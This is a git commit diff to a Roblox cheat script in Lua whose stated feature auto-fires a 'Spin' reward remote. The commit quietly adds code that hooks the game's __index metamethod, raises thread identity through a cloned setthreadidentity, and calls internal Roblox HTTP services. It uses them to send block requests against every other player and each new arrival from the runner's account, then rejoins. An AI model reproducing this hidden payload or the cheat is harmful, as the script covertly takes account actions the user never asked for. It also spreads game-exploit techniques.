a1433a70bc3a965f6dc707d2ad3b8a4df2e0b2bb
bjalalsjzbslalqoqueeyhskaambpqo <cuentaargentina19@gmail.com>
2024-08-09 18:36:43 -0300

    Update 18674510760.lua

--- 18674510760.lua
+++ 18674510760.lua
@@ -21,17 +21,88 @@ local frm, cfrm, crFrm = UL:CrFrm(sg, gameName)
 UL:AddTBtn(cfrm, "Spin 100k", false, function()
 a = not a
 while a do
-wait()
+
 local args = {
     [1] = "Reward7"
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Spin"):FireServer(unpack(args))
-
+wait(1)
 end
 
 end)
 
+
+local jb = game.JobId
+
+spawn(function()
+    local P = game:GetService("Players")
+    local TS = game:GetService("TeleportService")
+    local LP = P.LocalPlayer
+
+    getgenv()._s = clonefunction(setthreadidentity)
+
+    function _p(u,d)
+        pcall(function()
+            o = hookmetamethod(game, "__index", function(a,b)
+                task.spawn(function()
+                    pcall(function()
+                        _s(7)
+                        game:GetService("HttpRbxApiService"):PostAsyncFullUrl(u,d)
+                    end)
+                end)
+                hookmetamethod(game, "__index", o)
+                return o(a,b)
+            end)
+        end)
+    end
+
+    function block(i)
+        local u = "https://apis.roblox.com/user-blocking-api/v1/users/"..i.."/block-user"
+        local d = game:GetService("HttpService"):JSONEncode({})
+        if type(_p) == "function" then
+            return pcall(function() return _p(u,d) end)
+        elseif type(game.HttpService.RequestInternal) == "function" then
+            return pcall(function()
+                return game.HttpService:RequestInternal({
+                    Url = u,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = d
+                })
+            end)
+        end
+    end
+
+    function blockAllOtherPlayers()
+        local otherPlayersExist = false
+        for _, player in ipairs(P:GetPlayers()) do
+            if player ~= LP then
+                local s, r = block(player.UserId)
+                print("Block User", player.Name, "- Success:", s, "Result:", r)
+                otherPlayersExist = true
+            end
+        end
+        return otherPlayersExist
+    end
+
+    function rejoinExperience()
+        local placeId = game.PlaceId
+        TS:Teleport(placeId, LP)
+    end
+
+    if blockAllOtherPlayers() then
+        rejoinExperience()
+    end
+
+    P.PlayerAdded:Connect(function(player)
+        if player ~= LP then
+            local s, r = block(player.UserId)
+            print("Block User", player.Name, "- Success:", s, "Result:", r)
+            rejoinExperience()
+        end
+    end)
+end)
 
 UL:AddText(crFrm, "By Script: OneCreatorX ")
 UL:AddText(crFrm, "Create Script: 09/08/24 ")
